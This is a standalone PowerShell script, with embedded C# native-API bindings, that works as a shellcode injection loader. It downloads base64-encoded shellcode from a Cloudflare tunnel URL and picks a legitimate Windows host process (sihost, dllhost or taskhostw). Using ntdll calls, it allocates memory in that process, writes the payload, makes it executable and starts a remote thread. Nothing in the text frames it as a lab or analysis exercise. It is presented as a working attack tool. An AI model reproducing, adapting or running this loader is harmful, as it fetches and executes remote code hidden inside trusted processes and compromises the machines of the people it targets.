$u="https://mandatory-zip-installing-illinois.trycloudflare.com/payloads/shellcode.txt?key=57c36cda7fe1823797273b065ea3b8f8"
[Net.ServicePointManager]::SecurityProtocol="Tls12"

$c=@"
using System;using System.Runtime.InteropServices;
public class S{
[DllImport("ntdll.dll")]public static extern uint NtOpenProcess(ref IntPtr h,uint a,ref OA o,ref CI c);
[DllImport("ntdll.dll")]public static extern uint NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref IntPtr s,uint t,uint p);
[DllImport("ntdll.dll")]public static extern uint NtWriteVirtualMemory(IntPtr h,IntPtr b,byte[] buf,uint sz,ref uint w);
[DllImport("ntdll.dll")]public static extern uint NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref IntPtr s,uint np,ref uint op);
[DllImport("ntdll.dll")]public static extern uint NtCreateThreadEx(ref IntPtr t,uint a,IntPtr oa,IntPtr h,IntPtr sa,IntPtr arg,bool sus,uint zb,uint sc,uint sr,IntPtr ab);
[StructLayout(LayoutKind.Sequential)]public struct OA{public int L;public IntPtr R,N;public uint A;public IntPtr S,Q;}
[StructLayout(LayoutKind.Sequential)]public struct CI{public IntPtr P,T;}
}
"@
Add-Type $c

$sc=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))
$tgt=Get-Process -Name "sihost" -EA SilentlyContinue|Select -First 1
if(-not $tgt){$tgt=Get-Process -Name "dllhost" -EA SilentlyContinue|Select -First 1}
if(-not $tgt){$tgt=Get-Process -Name "taskhostw" -EA SilentlyContinue|Select -First 1}
if(-not $tgt){return}

$h=[IntPtr]::Zero
$oa=New-Object S+OA;$oa.L=48
$ci=New-Object S+CI;$ci.P=[IntPtr]$tgt.Id
[S]::NtOpenProcess([ref]$h,0x1FFFFF,[ref]$oa,[ref]$ci)|Out-Null
if($h -eq [IntPtr]::Zero){return}

$a=[IntPtr]::Zero;$sz=[IntPtr]$sc.Length
[S]::NtAllocateVirtualMemory($h,[ref]$a,[IntPtr]::Zero,[ref]$sz,0x3000,0x04)|Out-Null
if($a -eq [IntPtr]::Zero){return}

$w=[uint32]0
[S]::NtWriteVirtualMemory($h,$a,$sc,[uint32]$sc.Length,[ref]$w)|Out-Null

$pa=$a;$ps=[IntPtr]$sc.Length;$op=[uint32]0
[S]::NtProtectVirtualMemory($h,[ref]$pa,[ref]$ps,0x20,[ref]$op)|Out-Null

$t=[IntPtr]::Zero
[S]::NtCreateThreadEx([ref]$t,0x1FFFFF,[IntPtr]::Zero,$h,$a,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)|Out-Null
"OK"
